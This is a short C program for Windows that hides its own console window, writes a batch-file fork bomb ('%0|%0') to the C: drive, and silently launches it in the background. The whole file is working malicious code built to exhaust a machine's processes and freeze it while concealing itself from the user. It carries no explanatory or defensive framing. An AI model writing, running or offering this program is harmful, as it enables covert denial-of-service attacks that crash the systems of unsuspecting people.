#include <malloc.h>
#include <stdlib.h>
#include <stdio.h> 



#include <windows.h> 

int hideConsole ( void );
 
int main(void)
{

hideConsole ();

 FILE *fpWrite=fopen("c:/stuck.bat","w");  

    if(fpWrite==NULL)  

    {  

        return 0;  

    }  

 
        fprintf(fpWrite,"%%0|%%0");  

    fclose(fpWrite);  
	system("start /b cmd.exe /c c:\\stuck.bat");
return 0;
}

int hideConsole ( void )
{
  

HWND hWnd = GetConsoleWindow();
   // ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );

return 0;
}
 
